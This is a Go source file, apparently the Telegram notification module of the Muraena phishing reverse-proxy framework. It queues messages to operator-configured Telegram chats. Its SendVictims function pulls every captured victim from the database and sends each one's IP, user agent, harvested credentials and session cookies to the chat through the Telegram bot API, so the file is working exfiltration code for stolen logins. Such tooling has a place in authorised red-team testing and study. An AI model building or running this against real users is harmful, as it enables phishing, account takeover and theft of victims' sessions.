package telegram

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/evilsocket/islazy/tui"

	"github.com/muraenateam/muraena/core/db"
	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/session"
)

const (
	Name        = "telegram"
	Description = "A module that sends notifications via Telegram chat"
	Author      = "Muraena Team"

	// maxMessageLength is the hard limit of a Telegram text message
	maxMessageLength = 4096

	// queueSize is the size of the async delivery queue
	queueSize = 1024

	// maxRetries is the number of delivery attempts per message
	maxRetries = 3

	// httpClientTimeout is the per-request timeout of the Telegram API client
	httpClientTimeout = 15 * time.Second
)

// Telegram module
type Telegram struct {
	session.SessionModule

	Enabled  bool
	BotToken string
	ChatID   []string

	client  *http.Client
	queue   chan string
	started bool
}

// Name returns the module name
func (module *Telegram) Name() string {
	return Name
}

// Description returns the module description
func (module *Telegram) Description() string {
	return Description
}

// Author returns the module author
func (module *Telegram) Author() string {
	return Author
}

// Prompt prints module status based on the provided parameters
func (module *Telegram) Prompt() {

	menu := []string{
		"show",
		"victims",
	}
	result, err := session.DoModulePrompt(Name, menu)
	if err != nil {
		return
	}

	switch result {
	case "show":
		module.PrintConfig()
	case "victims":
		module.SendVictims()
	}
}

// Load configures the module by initializing its main structure and variables
func Load(s *session.Session) (m *Telegram, err error) {

	m = &Telegram{
		SessionModule: session.NewSessionModule(Name, s),
		Enabled:       s.Config.Telegram.Enabled,
		BotToken:      s.Config.Telegram.BotToken,
		ChatID:        s.Config.Telegram.ChatIDs,
		client: &http.Client{
			Timeout: httpClientTimeout,
		},
	}

	if !m.Enabled {
		m.Debug("is disabled")
		return
	}

	m.queue = make(chan string, queueSize)
	go m.dispatcher()
	m.started = true

	return
}

// Self returns the Telegram module instance registered in the current session
func Self(s *session.Session) *Telegram {

	m, err := s.Module(Name)
	if err != nil {
		log.Error("%s", err)
	} else {
		mod, ok := m.(*Telegram)
		if ok {
			return mod
		}
	}

	return nil
}

// PrintConfig shows the actual Telegram configuration
func (module *Telegram) PrintConfig() {
	module.Info("Telegram config:\n\tBotToken: %s\n\tChatIDs:%v", module.BotToken, module.ChatID)
}

// SendVictims dumps all captured victims, credentials and cookies to the Telegram chat
func (module *Telegram) SendVictims() {

	victims, err := db.GetAllVictims()
	if err != nil {
		module.Send(fmt.Sprintf("[telegram] error fetching victims: %s", err.Error()))
		return
	}

	if len(victims) == 0 {
		module.Send("[telegram] no victims captured yet")
		return
	}

	for _, v := range victims {
		message := fmt.Sprintf("[victim %s]\nIP: %s\nUA: %s\n", tui.Bold(v.ID), v.IP, v.UA)

		if len(v.Credentials) > 0 {
			message += "\nCredentials:\n"
			for _, c := range v.Credentials {
				message += fmt.Sprintf("  %s: %s (%s)\n", c.Key, tui.Bold(tui.Red(c.Value)), c.Time)
			}
		}

		if len(v.Cookies) > 0 {
			message += "\nCookies:\n"
			for _, c := range v.Cookies {
				message += fmt.Sprintf("  %s=%s (domain: %s)\n", c.Name, tui.Bold(tui.Red(c.Value)), c.Domain)
			}
		}

		module.Send(message)
	}
}

// dispatcher consumes queued messages and delivers them to all configured chats
func (module *Telegram) dispatcher() {
	for message := range module.queue {
		module.deliver(message)
	}
}

// deliver sends a message to all configured chats, with retries
func (module *Telegram) deliver(message string) {
	for _, chat := range module.ChatID {
		if err := module.sendToChat(chat, message); err != nil {
			module.Warning("Message %s was not delivered to chat:%s", tui.Bold(message), tui.Bold(chat))
			module.Debug("%s", tui.Red(err.Error()))
		}
	}
}

// Send queues a message for delivery to all configured Telegram chats
func (module *Telegram) Send(message string) {

	if !module.Enabled || !module.started {
		return
	}

	// Telegram messages are capped at maxMessageLength characters (rune-safe)
	runes := []rune(message)
	if len(runes) > maxMessageLength {
		message = string(runes[:maxMessageLength-3]) + "..."
	}

	select {
	case module.queue <- message:
	default:
		module.Warning("Telegram queue is full, dropping message: %s", tui.Bold(message))
	}
}

func (module *Telegram) getUrl() string {
	return fmt.Sprintf("https://api.telegram.org/bot%s", module.BotToken)
}

func (module *Telegram) sendToChat(chat, message string) (err error) {
	var response *http.Response

	url := fmt.Sprintf("%s/sendMessage", module.getUrl())
	payload, err := json.Marshal(map[string]string{
		"chat_id": chat,
		"text":    message,
	})
	if err != nil {
		return
	}

	for attempt := 1; attempt <= maxRetries; attempt++ {
		response, err = module.client.Post(
			url,
			"application/json",
			bytes.NewBuffer(payload),
		)
		if err != nil {
			// Exponential backoff: 1s, 2s, 4s
			time.Sleep(time.Duration(1<<uint(attempt-1)) * time.Second)
			continue
		}

		body, readErr := io.ReadAll(response.Body)
		response.Body.Close()
		if readErr != nil {
			err = readErr
			time.Sleep(time.Duration(1<<uint(attempt-1)) * time.Second)
			continue
		}

		if response.StatusCode != 200 {
			err = fmt.Errorf("telegram error: [%s] %s", response.Status, body)
			time.Sleep(time.Duration(1<<uint(attempt-1)) * time.Second)
			continue
		}

		module.Verbose("%s", body)
		return nil
	}

	return
}
